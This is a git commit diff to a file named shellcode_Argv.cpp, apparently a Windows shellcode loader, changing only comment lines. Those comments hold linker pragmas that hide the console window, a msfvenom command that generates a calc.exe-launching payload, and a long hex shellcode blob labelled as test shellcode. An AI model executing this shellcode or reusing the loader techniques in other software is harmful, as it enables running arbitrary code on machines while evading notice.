3c3c1ad0445de4d295ca9a5566b7818083c1678b
“ <yanwumail@163.com>
2021-01-30 13:34:58 +0800

    bug fixed

--- shellcode_Argv.cpp
+++ shellcode_Argv.cpp
@@ -7,7 +7,7 @@ using namespace std;
 //#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")//不显示窗口  
 //#pragma comment(linker,"/MERGE:.rdata=.text /MERGE:.data=.text /SECTION:.text,EWR")//减小编译体积  
 //shellcode在生成payload时选择c即可  
-//msfvenom -p windows/exec CMD=calc.exe -f c  
+//msfvenom -p windows/exec CMD=calc.exe -f c 
 //测试shellcode（执行cmd）：bf6e4a2508d9ebd97424f45d33c9b131317d13037d1383c56aa8d0f49aae1b055acf92e06bcfc161dbff8224d774c6dc6cf8cfd3c5b729ddd6e40a7c54f75e5e6538939fa2255ecd7b21cde2087fce894291566d1290772029cb57c2fe67dedce342a857d7392bbe26c180ff8730d8382fabaf304c56a8862f8c3d1d9747e5f9268b70892460f6d52877db6d54fcdaa1dd46f965861d603f62f39d5fcdac3b2be3b93176693fc70cdf3fd70e4f28e685002ff74f65cf155a9378800f1ee533fa5c10b00f1ce7a86519a36e9553bc1a99c0bd0efa872dd2d322d6712c
 //20210131更新,修复bug
 
